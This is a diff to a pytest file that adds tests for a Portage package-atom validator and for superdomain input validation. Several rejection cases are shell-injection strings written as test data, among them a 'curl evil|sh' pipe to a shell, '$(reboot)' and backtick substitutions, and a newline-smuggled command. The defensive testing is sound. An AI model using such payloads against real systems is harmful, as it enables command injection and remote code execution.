@@ -21,6 +21,7 @@ from snapdragon_studio.core.validate import (
     validate_home_backup,
     validate_home_device,
     validate_org,
+    validate_package_atoms,
     validate_username,
 )
 
@@ -256,3 +257,61 @@ def test_keyzip_domain_conf_json_injection_rejected(tmp_path):
     keyzip._apply_domain_conf(p, cfg, warnings)
     assert cfg.brand == "snapdragon"
     assert warnings
+
+
+# ---- validate_package_atoms: shell-word-safe Portage atoms (packages_add/drop) ----
+
+@pytest.mark.parametrize("atoms", [
+    "",                                       # empty = no packages
+    "app-editors/vim",
+    "app-editors/vim app-misc/tmux dev-vcs/git",
+    "sys-fs/ecryptfs-utils sys-apps/keyutils",
+    "virtual/foo x11-libs/gtk+3",             # '+' legal
+    "dev-libs/libFoo",                        # caps in the package name legal
+    "cat.d/pkg_1.2-r3",                       # '.', '_', '-' legal
+    "  app-editors/vim   dev-vcs/git  ",      # extra whitespace is just word separation
+])
+def test_validate_package_atoms_accepts(atoms):
+    assert validate_package_atoms(atoms) == atoms
+
+
+@pytest.mark.parametrize("bad", [
+    "vim",                                    # no category/name slash
+    "app-editors/vim; reboot",                # ';' shell metacharacter
+    "app-editors/vim && curl evil|sh",
+    "$(reboot)/pkg",
+    "`id`/pkg",
+    "app-editors/vim`id`",
+    "app-editors/",                           # empty package name
+    "/vim",                                   # empty category
+    "App-Editors/vim",                        # uppercase category rejected
+    "cat/pkg with spaces/inside",             # a word 'with' has no slash
+])
+def test_validate_package_atoms_rejects(bad):
+    with pytest.raises(IdentityValidationError):
+        validate_package_atoms(bad)
+
+
+def test_validate_package_atoms_newline_word_rejected():
+    # a genuine newline-carrying atom word must fail closed (would break a KEY=VALUE line)
+    with pytest.raises(IdentityValidationError):
+        validate_package_atoms("app-editors/vim\napp-misc/evil;reboot")
+
+
+# ---- superdomain validation (.internal must be accepted; injection rejected) ------
+
+def test_superdomain_internal_accepted_and_derived_valid():
+    # an explicit <brand>.internal passes validate_identity; "" derives it (also valid)
+    ImageConfig(mode="mesh", role="omnibus", superdomain="snapdragon.internal").to_cli_args()
+    ImageConfig(mode="mesh", role="omnibus", brand="acme").to_cli_args()   # derived acme.internal
+
+
+@pytest.mark.parametrize("bad", [
+    'x"; reboot; #.internal',
+    "a,b.internal",                # comma
+    "bad_label.internal",          # underscore not a DNS label char
+    "x|y.internal",
+])
+def test_superdomain_injection_rejected(bad):
+    with pytest.raises(IdentityValidationError):
+        ImageConfig(mode="mesh", role="omnibus", superdomain=bad).to_cli_args()
